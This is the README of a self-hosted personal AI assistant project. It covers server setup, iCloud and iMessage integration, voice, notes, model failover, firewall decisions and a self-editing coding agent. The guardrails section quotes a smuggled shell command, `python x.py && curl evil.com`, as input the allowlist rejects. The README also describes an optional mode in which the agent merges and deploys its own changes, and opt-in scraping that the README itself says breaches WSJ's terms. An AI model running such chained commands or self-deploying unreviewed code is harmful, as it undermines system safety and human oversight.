# Jarvis

A self-hosted personal AI assistant. Runs on your own server, reachable from any
device you authorise, and wired into your Apple mail, calendar and messages.

Everything in the default setup is free: Groq's free API tier for the model,
iCloud's own IMAP/CalDAV for mail and calendar, yfinance for markets, WSJ's public
feeds for news, and self-hosted SearXNG for web search. No per-request billing
anywhere in the stack.

---

## What it does

| Capability | How | Cost |
|---|---|---|
| Conversation + reasoning | Groq + optional Cerebras/OpenRouter/Together, with failover | free tier |
| **Email** — triage, expand, search, send | iCloud IMAP/SMTP, app-specific password | free |
| **Calendar** — read, book, move, delete, find free slots | iCloud CalDAV | free |
| **Messages** — read iMessage/SMS, send | Mac bridge reading `chat.db` | free, needs a Mac |
| **Stocks** — quotes, history, ticker news | yfinance | free, no key |
| **WSJ headlines** | WSJ public RSS feeds | free |
| **Web search + page reading** | SearXNG → Brave → DuckDuckGo | free |
| **Full articles** — rendered + signed in | Chromium via Playwright, imported session | free, opt-in |
| **Nearby places** — "I need a haircut" | OpenStreetMap, using *device* location | free, no key |
| **Open apps on your device** | URL schemes + Apple Shortcuts | free |
| **Voice** — HUD, wake word, speaks back | Web Speech API + Groq Whisper | free |
| **Voice identity** — answers only you | MFCC voiceprint, alerts on strangers | free |
| **Notes** — answers from your own markdown vault | keyword index over a mounted folder | free, no key |
| **Knowledge galaxy** — 3D vault, ask it questions, flies to sources | WebGL, vendored not CDN | free |
| **Memory** | SQLite, injected into every prompt | free |
| **Self-improvement** | Sandboxed agent that edits its own code and runs tests | free |

34 tools, all registered through one plugin-style registry — adding a capability
means dropping a file in `server/jarvis/tools/`.

---

## Read this before you start

Three things about the request are worth being straight about up front.

**iMessage cannot be read from a Linux server, or from an iPhone.** Apple ships
no server API for Messages, and iOS sandboxes `chat.db` beyond the reach of any
app or Shortcut. The only path to your message history is a Mac you own:
`bridge/jarvis_bridge.py` reads the local `chat.db` and mirrors messages up, and
sends replies back out.

The Mac doesn't need to run continuously — start it whenever, and the bridge picks
up from where it stopped. Meanwhile every other feature works normally and the
messages tools stay hidden, so Jarvis won't claim it can see your texts.

Without a Mac at all, an iPhone Shortcut can forward *new incoming* messages —
no history, and it can't send replies. See
[docs/iphone-messages.md](docs/iphone-messages.md). **This is the one capability
with a hardware prerequisite.**

**WSJ headlines come from public feeds by default.** Out of the box you get every
headline and summary from the WSJ's free RSS, and a link to read the piece in your
subscription.

Full article text is available but opt-in: [docs/browser.md](docs/browser.md) turns
on a real browser that reads pages signed in, using a session you export from your
own browser rather than a password Jarvis holds. Be clear-eyed about it — WSJ's terms
prohibit automated access, so this is a decision to make knowingly. It ships off.

**You need a domain, but it can be free.** A domain is just a name pointing at
your server's IP address — and you need one because HTTPS certificates can't be
issued for a bare IP, while browsers block both the microphone and geolocation on
anything that isn't HTTPS. So no domain means no voice and no "near me".
DuckDNS gives you one free in about two minutes; a bought one is ~$10/year and
works identically. Walkthrough in [docs/domain.md](docs/domain.md).

---

## Setup

### 1. Server

On your Oracle Cloud instance (Ubuntu 22.04+, the free ARM shape is plenty):

```bash
sudo apt-get update -qq && sudo apt-get install -y -qq git && \
{ [ -d ~/Jarvis/.git ] || git clone -b claude/jarvis-ai-assistant-9tlgu3 \
  https://github.com/MichaelGrum10/Jarvis.git ~/Jarvis; } && \
bash ~/Jarvis/scripts/bootstrap.sh
```

Interrupted partway? Re-run the same command — it picks up where it stopped and
keeps any credentials you already entered.

Git will ask for your GitHub username and a personal access token as the
password — this repo is private, so an unauthenticated download can't work. See
[docs/private-repo-access.md](docs/private-repo-access.md) for how to create the
token, or how to make the repo public instead if you'd rather not.

The script then installs Docker, opens the firewall and walks you through
credentials. Re-running it is safe — every step checks before acting.

**Setting up from a phone?** [docs/setup-from-iphone.md](docs/setup-from-iphone.md)
covers the whole install from an iPhone, including getting SSH working.

Prefer to do it by hand:

```bash
sudo apt update && sudo apt install -y docker.io docker-compose-v2 git
sudo usermod -aG docker $USER && newgrp docker

git clone https://github.com/MichaelGrum10/Jarvis.git
cd Jarvis
bash scripts/setup.sh
```

The script generates both signing secrets, asks for your password, Groq key and
Apple credentials, writes `.env` with `600` permissions, and points the
`Caddyfile` at your domain. Re-run it any time to change one value without
retyping the rest — it keeps your existing `AUTH_SECRET`, so re-running won't
sign your devices out.

Prefer doing it by hand? `cp .env.example .env` and fill it in.

### 2. Apple credentials

Both mail and calendar use one **app-specific password** — not your Apple ID
password, and revocable at any time without touching your account.

1. <https://account.apple.com> → Sign-In and Security → App-Specific Passwords
2. Generate one, label it "Jarvis"
3. Put it in `.env` as `ICLOUD_APP_PASSWORD`, with your Apple ID in `ICLOUD_EMAIL`

Calendar reuses those automatically.

### 3. Domain and TLS

Don't have a domain? **[docs/domain.md](docs/domain.md)** walks through getting a
free DuckDNS one — about two minutes, no card. `scripts/setup.sh` writes it into
the `Caddyfile` for you.

Open ports 80 and 443 in both the Oracle security list *and* the instance
firewall:

```bash
sudo iptables -I INPUT -p tcp --dport 80 -j ACCEPT
sudo iptables -I INPUT -p tcp --dport 443 -j ACCEPT
sudo netfilter-persistent save
```

### 4. Launch

```bash
docker compose up -d
docker compose logs -f jarvis
```

Then check everything connected:

```bash
docker compose exec jarvis python -m jarvis.doctor
```

It tests each credential for real — logs into iCloud, calls Groq, lists your
calendars — and names the specific fix for anything broken. **Secrets are masked
in its output**, so the result is safe to paste into an issue or a chat when you
want a hand.

Visit your domain, enter `ACCESS_PASSWORD`, and on iOS tap Share → **Add to Home
Screen**. It installs as a real app: own icon, no browser chrome, remembers the
device token.

### 5. Messages bridge (optional, needs a Mac)

See **[docs/messages-bridge.md](docs/messages-bridge.md)**. Short version:

```bash
export JARVIS_URL="https://your-domain.com"
export JARVIS_BRIDGE_TOKEN="same as BRIDGE_TOKEN in .env"
python3 bridge/jarvis_bridge.py
```

Grant Full Disk Access to Terminal first, or it can't read `chat.db`.

No Mac available? [docs/iphone-messages.md](docs/iphone-messages.md) covers the
partial iPhone route and is explicit about what it can't do.

---

## Updating

```bash
cd ~/Jarvis && bash scripts/update.sh
```

Pulls, rebuilds, and confirms the app answers before saying it worked.

Don't use `git pull && docker compose up -d` for this. The server code is baked
into the image at build time rather than mounted from the checkout, so the pull
updates the files on disk while the container carries on running the previous
build. Both commands report success and nothing has changed — the usual way this
surfaces is a fix that demonstrably isn't applied. `up -d` on its own *is* right
for `.env` changes; compose recreates the container when those change.

Then check the result over:

```bash
docker compose exec jarvis python -m jarvis.doctor
```

---

## Using it

Ask normally. Jarvis picks its own tools.

- *"What's on my calendar today?"*
- *"Anything important in my inbox?"* → ranked digest → *"expand the second one"*
- *"I need a haircut"* → checks your free slots, finds barbers near **your phone**,
  and books the one you pick
- *"How's NVDA doing?"* / *"WSJ markets headlines"*
- *"Text Sara I'm running 10 minutes late"* → shows you the exact wording, waits for yes
- *"Open Spotify"*

Location comes from the browser's Geolocation API on whichever device you're
holding — never the server's IP. Tap the ◎ button to share it. This is why the
travel case works: the server sits in a datacentre, but "near me" resolves to
wherever you actually are.

### Talk or type — one screen

There is no mode switch. The HUD is the whole app: a ring you tap to talk, a type
bar underneath it, and panels for markets, the day's briefing and the inbox.

**The reply comes back the way the question went in.** Type and the answer is
written into a Transcript panel; talk to the ring and it is spoken aloud. The 🎙
on the type bar is dictation only — it fills the box and leaves the sending to
you. Talking over Jarvis mid-sentence cuts him off and starts listening.

The ring carries the state: cyan while listening, **amber and pulsing while it
works**, bright while speaking, with the arc reactor in the middle tracking his
voice. Jarvis speaks in your cloned Fish Audio voice when it is configured, and
in the closest British voice the device has when it is not — and says which.

**It fixes itself, and builds what you ask for.** Say "add a tool that tracks
parcels" and it writes the code on a branch, runs the tests, and — in `apply`
mode — merges, rebuilds and restarts, rolling back automatically if the server
stops answering. Recurring bugs get the same treatment without being asked. With
an Anthropic API key the code is written by Claude; without one, by the free
pool. See `docs/self-improvement.md`.

**The best free models, measured.** `bash scripts/bestmodels.sh` benchmarks
every provider you have on the requests Jarvis actually sends and puts the ones
that pass a full-size tool-calling turn first; `weekly` keeps that order true as
free tiers change. See `docs/model-capacity.md`.

**More capacity, one command.** `bash scripts/omniroute.sh` runs
[OmniRoute](https://github.com/diegosouzapw/OmniRoute) as a sidecar — a local
gateway in front of a large catalogue of free providers — and puts it behind the
pool as the fallback for when your own keys are spent. See `docs/omniroute.md`.

Saying "Jarvis" hands-free only works on the Mac, where the companion agent
listens locally; no browser can keep a microphone open, and the app says so
rather than pretending.

It can also answer only *you*: enrol your voice, and other speakers are refused
with an alert pushed to every device. Be clear about what that is, though — a
recording of you will pass it, so it's a filter against other people in the room,
not the thing keeping strangers out. Measured error rates and the reasoning are
in [docs/voice-identity.md](docs/voice-identity.md); the basics are in
[docs/voice.md](docs/voice.md).

---

## Your notes

Point Jarvis at a folder of markdown — an Obsidian vault, an exported Notion, a
directory you write by hand — and it answers from what *you* wrote rather than
from what a model half-remembers. The same folder becomes a 3D galaxy: one star
per note, threads between the ones that reference each other.

- *"What did I write about the Punic Wars?"* → the notes, quoted, named
- *"Remember that the Oracle box reboots on Sundays"* → a new note, a new star
- ☰ → **Knowledge galaxy** → drag to orbit, tap a star to read it

Ask by voice with the galaxy open and the camera dives to the notes the answer
came from, as the answer arrives.

The default mount is `./notes` in this checkout, so it works with nothing
configured. To use an existing vault:

```bash
bash scripts/setkey.sh NOTES_HOST_DIR /home/ubuntu/vault
docker compose up -d
```

Search is keyword overlap with titles weighted, not embeddings — a deliberate
trade against a free-tier token budget, explained along with everything else in
**[docs/notes.md](docs/notes.md)**.

---

## Running out of capacity

Free tiers meter tokens per minute, and one turn here carries ~30 tool schemas —
so a busy minute can stop everything. The client keeps a pool of endpoints
(provider × key × model) and fails over rather than retrying a busy one.

The default key already gives three endpoints. Adding a second *provider* is the
best way to get more; they're free, OpenAI-compatible, and drop straight in:

```bash
CEREBRAS_API_KEY=csk_...      # cloud.cerebras.ai
OPENROUTER_API_KEY=sk-or-...  # openrouter.ai/keys
```

Full detail, including how to pick a better model and why stacking accounts at
one provider is a bad idea, in [docs/model-capacity.md](docs/model-capacity.md).

## Skills

A skill is a standing instruction with trigger phrases. Say one and Jarvis
follows that procedure instead of improvising a different answer each time.

Four ship built in — **morning brief**, **end of day**, **book appointment**,
**market check** — and you can write your own from the drawer (**✦ Skills**).
The instruction is plain English, so "check the calendar, then the inbox, lead
with anything time-critical, under 150 words" is a complete skill.

## Continuous self-improvement

Jarvis records every failure — tool errors, model errors, and requests where it
said it *couldn't* do something. When one recurs, it diagnoses the root cause,
fixes it on a branch, and runs the test suite.

```bash
IMPROVE_MODE=propose   # fix + test + notify you; you merge
```

It cannot make the model smarter — that comes from the provider. It fixes bugs,
builds tools you keep asking for, and grows test coverage.
[docs/self-improvement.md](docs/self-improvement.md) covers why `propose` is the
default and what it can't see.

## Self-improvement (manual)

The AutoGPT-style part. Open the drawer → **Self-improve**, describe a goal, and
Jarvis reads its own source, edits it, runs the test suite, reads the failures,
and iterates until green.

Guardrails, because this edits the code that runs it:

- Work happens on a throwaway git branch, never your working branch
- `.env`, `.git`, and anything outside the repo are unreachable — enforced by
  path resolution, with tests covering traversal attempts
- Shell access is an allowlist (`pytest`, `python`, `ruff`, `git`, …); shell
  metacharacters are rejected so `python x.py && curl evil.com` can't slip through
- It never merges, deploys, or restarts anything. You get a branch and a diff.
- Off by default — set `AUTONOMY_ENABLED=true`

Full detail in **[docs/autonomy.md](docs/autonomy.md)**.

---

## Development

```bash
cd server
python3 -m venv .venv && .venv/bin/pip install -e ".[dev]"
.venv/bin/pytest -q          # 52 tests
.venv/bin/ruff check jarvis tests
.venv/bin/uvicorn jarvis.main:app --reload
```

Adding a tool — the whole contract:

```python
from .base import ToolResult, registry

@registry.tool(
    name="weather_now",
    description="Current weather at the user's location.",
    parameters={"type": "object", "properties": {}},
    needs_location=True,      # dispatch refuses without device coordinates
    requires="",              # settings key that must be configured
)
async def weather_now(ctx=None):
    return ToolResult.success({"temp_c": 21})
```

Register the module name in `load_all_tools()` and it appears to the model on the
next request.

---

## Layout

```
server/jarvis/
  config.py        env-driven settings, per-feature credential checks
  db.py            SQLite models
  security.py      device tokens, bridge auth
  llm/client.py    Groq client, retry + model fallback
  agent/
    loop.py        the tool-calling loop, SSE events
    prompts.py     system prompt
    autonomy.py    self-improvement engine + sandbox
  notes.py         markdown vault: index, search, graph, capture
  tools/           34 tools, one file per domain
  api/voice.py     Whisper transcription endpoint
  integrations/    iCloud CalDAV + IMAP
  api/             auth, chat, device, bridge, autonomy routes
web/               installable PWA (app.js, voice.js, galaxy.js)
bridge/            Mac iMessage bridge (stdlib only)
```

---

## Decisions

A running log of choices that are easy to forget and expensive to rediscover.
Each one records what was chosen *and what it rules out*, because the second
half is what saves you the next time it looks wrong.

**Host — Oracle Cloud Ampere, `aarch64`, Ubuntu 24.04.4 LTS, Python 3.12.3.**
Measured on the instance, not assumed. The architecture matters for Docker
image tags, any downloaded binary, and Chromium; confirm it with `uname -m` on
the box itself, because a shell on your laptop or in a build container will
happily report `x86_64` instead.

**Docker-published ports bypass the INPUT chain.** Docker installs DNAT in
`nat/PREROUTING` and filters in `FORWARD`/`DOCKER`, so INPUT rules for 80, 443
and 8000 are not what makes the site reachable — the published bind address is.
This cuts both ways: adding an INPUT rule will not open a container port, and
deleting one will not close it. `127.0.0.1:8000:8000` in `docker-compose.yml`
is what keeps the app off the public interface, and it is the line to check
first when reasoning about exposure.

**Port 8000 is plaintext.** Caddy terminates TLS on 443 and proxies to
`jarvis:8000` over Docker's internal network. Anything reaching 8000 directly
carries the access password and device tokens unencrypted, which is why the
compose binding is localhost-only and why an `ss -tlnp` showing `0.0.0.0:8000`
would be a real finding rather than a tidiness issue.

**Two firewalls, not one.** Instance `iptables` *and* the VCN Security List in
the Oracle console. Both must pass, and both fail as a silent timeout. The
console half cannot be done from the shell:
Networking → Virtual Cloud Networks → your VCN → Security Lists → Add Ingress
Rules.

**Never `iptables -A INPUT`.** Oracle's Ubuntu image ends the INPUT chain with
a catch-all `REJECT ... icmp-host-prohibited`. Appending puts the new rule
*below* it, where it can never match — the command succeeds, the port stays
shut, and nothing says why. Insert above it (`-I INPUT <n>`, from
`--line-numbers`) and persist with `netfilter-persistent save`. Rules live in
`/etc/iptables/rules.v4`; `ufw` is deliberately not layered on top, per
Oracle's own guidance.

**The INPUT chain carries seven rules and no more.** 443, 80,
RELATED/ESTABLISHED, icmp, loopback, ssh, then the catch-all REJECT. Four
rules were removed as provably dead: one appended below the REJECT that had
matched zero packets in the machine's lifetime, a duplicate `dpt:8000` whose
counter was frozen behind the copy above it, and accepts for 8000 and 18789
where nothing public listens. Verify a rule is live by sampling
`iptables -L INPUT -n -v --line-numbers` twice and watching the counter, not
by reading the rule.

**`rpcbind` is masked.** It listened on `0.0.0.0:111`, is a host process rather
than a container (so INPUT genuinely governed it), and is an amplification
vector we have no use for without NFS. Note that `systemctl disable --now
rpcbind` is *not* enough — `rpcbind.socket` stays bound and re-triggers the
service, so both units need stopping and masking.

**Slow answers are rate limits, not resource contention.** Measured at idle:
load average 0.00, 8.6 GB of 11 GB available, with Ollama's model resident.
The box is not short of anything. Don't re-diagnose latency as a capacity
problem on the host — it is the free tier's tokens-per-minute ceiling, and the
fix is another provider or a local endpoint, not a bigger shape. There is no
swap, so the failure mode under a real spike is the OOM killer, not slowness.

**Local inference was evaluated and rejected.** Ollama is installed on the host
with `qwen2.5:3b` resident, `llama3` and `qwen2.5:7b` available. It is not
wired into the pool and should not be: inference runs at 100% CPU because the
Ampere shape has no GPU, and prompt evaluation for a turn carrying 16 tool
schemas takes longer on four ARM cores than waiting out the free tier's rate
limit. The 2048-token default context is a second blocker, though that one is
fixable with `num_ctx`. Revisit only on a machine with a GPU — not by trying a
different small model, which changes the wrong variable.

**Notes live in `./notes`, mounted at `/notes`.** One folder of markdown, read
from disk. `NOTES_DIR` is the container path and does not change;
`NOTES_HOST_DIR` repoints the host side at a real vault. The folder's contents
are gitignored — self-improvement pushes branches from this checkout, and a
private vault must never ride along.

**Note search is keyword overlap, not embeddings.** Embeddings would cost a
model call per note on every reindex, against a budget where one calendar
booking already spends most of a minute's tokens. Revisit only when a vault
gets big enough that overlap actually misses.

**The galaxy is WebGL, and the library is vendored.** `3d-force-graph` (with
three.js bundled) lives in `web/vendor/`, not on a CDN — the phone loads it from
the same origin as everything else, so the galaxy works offline and no third
party can change what the app runs. It replaced an earlier hand-rolled canvas
renderer, which cost ~300 lines of projection maths to do worse.

**The arc reactor's pulse is reconstructed, not measured — and only on the Web
Speech path.** Synthesised speech cannot be routed into an `AnalyserNode` in any
browser: the audio is the browser's, end to end, and there is no node to tap. So
that path rebuilds an envelope from the utterance text, corrected by `boundary`
events where they fire (rarely, on WebKit). Audio we control does go through a
real analyser, and that path is built and tested — it just has nothing to drive
it until a buffer-returning TTS exists. Anyone tempted to "fix" the envelope by
finding the right analyser incantation should know the answer is that there
isn't one.

**Node ids are array positions.** `/api/notes/graph` numbers each node by its
index, and search results are those numbers, so the viewer can fly the camera to
a note without a second lookup. The cost is that any reindex renumbers
everything: the graph carries a `generation` fingerprint, and anything holding
an id across a rebuild must check it or risk diving onto an unrelated star — a
wrong answer that looks exactly like a right one. Things that must survive a
rebuild (`/remember`'s `near`) reference notes by title instead.

**The Mac agent dials out; the server never dials in.** Mail, Calendar, screen
capture and Shortcuts only exist on a logged-in Mac, and that Mac is behind NAT
with no static address. The alternative — forwarding a port on a home router —
is a permanent public entry point in exchange for saving one outbound socket.
So the agent holds a WebSocket open to `/api/agent/ws` through the Caddy
endpoint that already exists, and a new connection replaces an old one because a
Mac waking from sleep reconnects long before the dead socket's TCP timeout
notices. `AGENT_SECRET` is separate from `BRIDGE_TOKEN` on purpose: they grant
different capability surfaces.

**Agent commands are an allowlist on both sides, and writes never act.** The
server checks the command name against its own list, and the Mac checks it
against a duplicated one — deliberately not shared, so a compromised server
still cannot ask the Mac for something outside it. Arguments are typed and
structured; there is no path from the socket to a shell. Anything that sends or
changes state returns `pending_confirmation` rather than doing it, and every
received command lands in `~/jarvis-agent.log` before it runs.

---

## Security

One password guards everything, so treat it like a house key.

**Credentials only ever go into `.env` on your own server.** `scripts/setup.sh`
prompts for them there; `.env` is gitignored and written `600`. Nothing needs to
be sent anywhere else — and if a credential does end up somewhere it shouldn't,
both the Groq key and the Apple app-specific password are revocable in seconds
from their respective dashboards, with no effect on the rest of your account.
`jarvis.doctor` masks every secret it prints for the same reason.

- Device tokens are signed and expire after 90 days; rotating `AUTH_SECRET`
  revokes every device instantly
- The bridge uses a *separate* secret, so a compromised phone token still can't
  forge messages into your history
- TLS via Caddy with automatic Let's Encrypt renewal; the app port binds to
  localhost only
- Your Apple app-specific password is revocable without disturbing your Apple ID
- Nothing leaves your server except calls to Groq, and to the specific public
  APIs a tool needs
